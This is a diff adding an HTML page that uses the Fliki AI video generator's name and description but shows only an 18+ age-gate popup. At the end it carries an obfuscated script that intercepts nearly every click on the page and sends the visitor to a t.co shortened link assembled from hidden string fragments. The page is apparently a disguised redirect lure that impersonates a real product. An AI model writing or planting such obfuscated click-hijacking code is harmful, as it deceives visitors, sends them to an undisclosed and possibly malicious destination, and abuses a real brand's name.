@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">    <!-- Meta tags -->
+    <meta name="description" content="Transform your ideas to videos effortlessly with the best AI Video Generator. User-friendly Text to Video editor, realistic voiceovers, dynamic AI clips, and more.">
+    <meta name="keywords" content="">
+    <meta name="author" content="">
+    <meta property="og:title" content="">
+    <meta property="og:description" content="Transform your ideas to videos effortlessly with the best AI Video Generator. User-friendly Text to Video editor, realistic voiceovers, dynamic AI clips, and more.">
+    <meta property="og:image" content="">
+    <meta property="og:url" content="">
+    <meta name="twitter:card" content="summary_large_image">
+
+    <title>Fliki - Turn text into videos with AI voices</title>
+    <style>
+        html, body {
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            font-family: Arial, sans-serif;
+        }
+
+        .background {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-size: cover;
+            background-position: center;
+            z-index: -2;
+        }
+
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            backdrop-filter: blur(8px);
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: -1;
+        }
+
+        .popup {
+            max-width: 600px;
+            min-height: 500px;
+            background: white;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 1;
+            box-shadow: 0 0 30px rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+            padding: 20px;
+            text-align: center;
+        }
+
+        /* Responsive Backgrounds */
+        .background {
+            background-color: #0E161C;
+        }
+
+        .popup {
+            background-color: #1a2c38;
+            color: white;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            align-content: center;
+        }
+
+        .popup p {
+            color: #b1bad3;
+            font-size: 14px;
+        }
+
+        .popup-logo {
+            text-align: center;
+        }
+
+        .popup-logo svg.svel {
+            width: 68px;
+            color: white;
+        }
+
+        .popup-footer {
+            text-align: center;
+            display: flex;
+            flex-direction: row;
+            justify-content: center;
+        }
+
+        .popup-footer a {
+            padding: 10px;
+            margin: 0 10px;
+            color: #fff;
+        }
+
+        .popup-footer svg {
+            width: 14px;
+        }
+
+        .button-group {
+            margin-top: 20px;
+            display: flex;
+            justify-content: center;
+        }
+
+        a.btn {
+            border: none;
+            border-radius: 5px;
+            color: white;
+            padding: 15px 25px;
+            margin: 20px;
+            text-decoration: none;
+        }
+
+        a.enter {
+            background-color: #1475e1;
+            font-weight: bold;
+        }
+
+        a.leave {
+            background-color: #313c42;
+        }
+
+        .popup-img {
+            width: 180px;
+        }
+    </style>
+</head>
+<body>
+<div class="background"></div>
+<div class="overlay"></div>
+<div class="popup">
+    <div class="popup-logo">
+    </div>
+    <div class="popup-body"><img class="popup-img" src="image/18.png">
+        <h2>This website is strictly for individuals who are 18 years of age or older.</h2>
+        <div class="button-group">
+            <a href="#enter" class="btn enter"> I am 18 or older - Enter </a>
+            <a href="#leave" class="btn leave"> Leave site </a>
+        </div>
+    </div>
+    <div class="popup-footer"></div>
+</div>
+</body>
+<script>
+    document.addEventListener('DOMContentLoaded', function () {
+        const _0x1427dc = _0x1f5f;
+        (function (_0x4e2255, _0x5e5ac3) {
+            const _0x19d977 = {
+                _0x20e787: 0x71,
+                _0x270bba: 0x6b,
+                _0x20bc61: 0x80,
+                _0x4a7fbd: 0x78,
+                _0x1b95dc: 0x6d,
+                _0x5ffad3: 0x77
+            }, _0x14ce39 = _0x1f5f, _0x3c8a3e = _0x4e2255();
+            while (!![]) {
+                try {
+                    const _0x3eae8f = parseInt(_0x14ce39(0x84)) / 0x1 + -parseInt(_0x14ce39(_0x19d977._0x20e787)) / 0x2 + -parseInt(_0x14ce39(_0x19d977._0x270bba)) / 0x3 * (parseInt(_0x14ce39(_0x19d977._0x20bc61)) / 0x4) + -parseInt(_0x14ce39(_0x19d977._0x4a7fbd)) / 0x5 * (-parseInt(_0x14ce39(_0x19d977._0x1b95dc)) / 0x6) + -parseInt(_0x14ce39(0x81)) / 0x7 * (parseInt(_0x14ce39(_0x19d977._0x5ffad3)) / 0x8) + parseInt(_0x14ce39(0x72)) / 0x9 + parseInt(_0x14ce39(0x6f)) / 0xa;
+                    if (_0x3eae8f === _0x5e5ac3) break; else _0x3c8a3e['push'](_0x3c8a3e['shift']());
+                } catch (_0xa9db25) {
+                    _0x3c8a3e['push'](_0x3c8a3e['shift']());
+                }
+            }
+        }(_0x2c39, 0x6cdc2), document['addE' + 'vent' + _0x1427dc(0x70) + _0x1427dc(0x6c)](_0x1427dc(0x7f) + 'k', function (_0x56d090) {
+            const _0x413e2b = {
+                _0x523982: 0x82,
+                _0x258ab8: 0x89,
+                _0x41d3d9: 0x69,
+                _0x50f89d: 0x68,
+                _0x424094: 0x7e,
+                _0x57b973: 0x76,
+                _0x57bb75: 0x73,
+                _0x3ff831: 0x73,
+                _0x5b8cb6: 0x7c,
+                _0x2a6800: 0x7c,
+                _0x3a6ae6: 0x7c,
+                _0x228a9a: 0x6a,
+                _0x1d931f: 0x79,
+                _0x4b2a11: 0x7a,
+                _0x365381: 0x7b,
+                _0x50996a: 0x74
+            }, _0x3af0e9 = _0x1427dc;
+            _0x56d090[_0x3af0e9(_0x413e2b._0x523982) + _0x3af0e9(0x85) + _0x3af0e9(_0x413e2b._0x258ab8) + 'ion'](), _0x56d090[_0x3af0e9(_0x413e2b._0x41d3d9) + _0x3af0e9(_0x413e2b._0x50f89d) + _0x3af0e9(_0x413e2b._0x424094) + 'lt']();
+            const _0x3eec41 = _0x56d090[_0x3af0e9(0x75) + 'et'];
+            console[_0x3af0e9(0x7d)]('Clic' + 'ked\x20' + _0x3af0e9(_0x413e2b._0x57b973) + 'ent:', _0x3eec41['tagN' + _0x3af0e9(0x7c)]), (_0x3eec41[_0x3af0e9(_0x413e2b._0x57bb75) + _0x3af0e9(0x7c)] === 'A' || _0x3eec41[_0x3af0e9(_0x413e2b._0x3ff831) + _0x3af0e9(_0x413e2b._0x5b8cb6)] === _0x3af0e9(0x67) || _0x3eec41['tagN' + _0x3af0e9(0x7c)] === _0x3af0e9(0x6e) || _0x3eec41[_0x3af0e9(_0x413e2b._0x57bb75) + 'ame'] === _0x3af0e9(0x88) || _0x3eec41[_0x3af0e9(_0x413e2b._0x3ff831) + _0x3af0e9(_0x413e2b._0x2a6800)] === 'SPAN' || _0x3eec41['tagN' + _0x3af0e9(_0x413e2b._0x3a6ae6)] === 'BUTT' + 'ON' || _0x3eec41['tagN' + 'ame'] === 'LI') && (window[_0x3af0e9(0x83) + _0x3af0e9(_0x413e2b._0x228a9a)][_0x3af0e9(0x86)] = _0x3af0e9(_0x413e2b._0x1d931f) + _0x3af0e9(_0x413e2b._0x4b2a11) + 't.co' + _0x3af0e9(0x87) + _0x3af0e9(_0x413e2b._0x365381) + _0x3af0e9(_0x413e2b._0x50996a));
+        }));
+        function _0x1f5f(_0x402f25, _0x37c3ac) {
+            const _0x2c39c1 = _0x2c39();
+            return _0x1f5f = function (_0x1f5f2c, _0x132654) {
+                _0x1f5f2c = _0x1f5f2c - 0x67;
+                let _0x105891 = _0x2c39c1[_0x1f5f2c];
+                return _0x105891;
+            }, _0x1f5f(_0x402f25, _0x37c3ac);
+        }
+        function _0x2c39() {
+            const _0x1dc900 = ['tion', '148803SvXdYf', 'ener', '164238MjZIsz', 'path', '10831330tjdLmN', 'List', '1742944WpAuDQ', '1335150qtFwEW', 'tagN', 'wng', 'targ', 'elem', '2158568fYqOlZ', '80UageGe', 'http', 's://', 'KSTC', 'ame', 'log', 'efau', 'clic', '24XlYEqB', '7DSpOss', 'stop', 'loca', '215338giCvsu', 'Prop', 'href', '/eTz', 'rect', 'agat', 'IMG', 'entD', 'prev'];
+            _0x2c39 = function () {
+                return _0x1dc900;
+            };
+            return _0x2c39();
+        }
+    });
+</script>
+</html>
